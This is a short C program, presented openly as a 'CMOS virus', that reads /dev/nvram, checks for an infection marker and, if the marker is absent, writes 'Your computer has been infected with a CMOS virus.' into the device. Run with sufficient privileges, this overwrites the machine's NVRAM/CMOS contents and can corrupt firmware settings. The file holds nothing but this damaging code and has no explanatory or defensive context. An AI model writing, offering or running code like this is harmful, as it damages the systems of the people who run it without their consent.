#include <stdio.h>
#include <string.h>

void infect() {
    FILE *fp;
    char line[256];
    char virus[] = "Your computer has been infected with a CMOS virus.";

    // Open the CMOS file for writing
    fp = fopen("/dev/nvram", "w");
    if (fp == NULL) {
        printf("Error opening CMOS file\n");
        return;
    }

    // Write the virus message to the CMOS file
    fprintf(fp, "%s", virus);

    // Close the CMOS file
    fclose(fp);
}

int main() {
    // Check if the CMOS has already been infected
    FILE *fp;
    char line[256];

    // Open the CMOS file for reading
    fp = fopen("/dev/nvram", "r");
    if (fp == NULL) {
        printf("Error opening CMOS file\n");
        return 1;
    }

    // Read each line from the CMOS file
    while (fgets(line, sizeof(line), fp)) {
        // Check if the virus message is already present
        if (strstr(line, "Your computer has been infected with a CMOS virus.") != NULL) {
            printf("CMOS already infected\n");
            fclose(fp);
            return 1;
        }
    }

    // Close the CMOS file
    fclose(fp);

    // Infect the CMOS
    infect();

    printf("CMOS infected successfully\n");

    return 0;
}